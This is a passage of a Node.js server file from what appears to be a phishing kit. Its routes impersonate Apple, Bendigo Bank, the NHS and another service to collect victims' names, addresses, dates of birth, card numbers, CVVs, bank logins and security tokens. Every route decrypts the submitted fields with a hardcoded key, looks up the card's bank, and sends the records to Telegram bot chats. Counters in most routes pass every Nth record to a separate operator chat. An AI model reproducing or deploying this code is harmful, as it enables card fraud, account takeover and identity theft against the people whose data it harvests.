      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cdbCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        cdbCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCDB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=911916233&text=Apple:\n${originalText}`
        );
        cdbCount += 1;
      }

      res.send("Update Completed");
    });
});

let clearstore = 0;

app.options("/baliApple", cors());

app.post("/baliApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBali:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1983666674,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }
    });
});

//WP
//WP
//WP

let wpCount = 0;

app.options("/wpSaveLogin", cors());

app.post("/wpSaveLogin", (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  telephone = req.body.telephone;
  owner = req.body.owner;

  var originalText = `+----------- Login Information ------------+\nCustomer ID: ${customerId}\nPassword: ${password}\nPhone Number: ${telephone}`;
  if (wpCount == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    wpCount = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=WPLoginSpooferGoofer:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=WPLogin:\n${originalText}`
    );
    wpCount += 1;
  }
  res.send("Update Completed");
});

//BENDIGO
//BENDIGO
//BENDIGO

let skiiBendigo = 0;

app.options("/bendigoLogin", cors());

app.post("/bendigoLogin", (req, res) => {
  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  owner = req.body.owner;

  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}`;
  if (skiiBendigo == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    skiiBendigo = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoLogin:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=BendigoLogin:\n${originalText}`
    );
    skiiBendigo += 1;
  }
  res.send("Update Completed");
});

app.options("/bendigoSkii", cors());

app.post("/bendigoSkii", (req, res) => {
  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secToken = CryptoJS.AES.decrypt(req.body.secToken, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}\nSecurity Token: ${secToken}\n+ ----------- Personal Information ------------+\nPhone Number: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (skiiBendigo == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    skiiBendigo = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoSkii:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=Bendigo:\n${originalText}`
    );
    skiiBendigo += 1;
  }

  res.send("Update Completed");
});

//NHS
//NHS
//NHS

app.options("/ciscoNHS", cors());

app.post("/ciscoNHS", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cya == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `NHSCisco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1911692807,
              text: `NHS:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/rolloNHS", cors());

app.post("/rolloNHS", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cya == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `NHSRollo:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5376831572,
              text: `NHS:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/cyaNHS", cors());

app.post("/cyaNHS", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cya == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-752137860",
              text: `NHS:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/sendKelvFriendResTwo", cors());

app.post("/sendKelvFriendResTwo", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1715235543&text=NHS2:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1341611061&text=NHS2:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS2:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/@kworthy1", cors());

app.post("/@kworthy1", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS3:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1715235543&text=NHS3:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/stillrunning", cors());

app.post("/stillrunning", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSStillRunning:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1065375205&text=NHS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1368320362&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

let Spoofergoofer = 4;

app.options("/spoofergooferNHS", cors());

app.post("/spoofergooferNHS", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSpooferGoofer:\n${originalText}`
      );
      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=NHS:\n${originalText}`
      );

      res.send("Update Completed");
    });
});

app.options("/nhsMason", cors());

app.post("/nhsMason", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else if (bin === "542011") {
        axios.post(
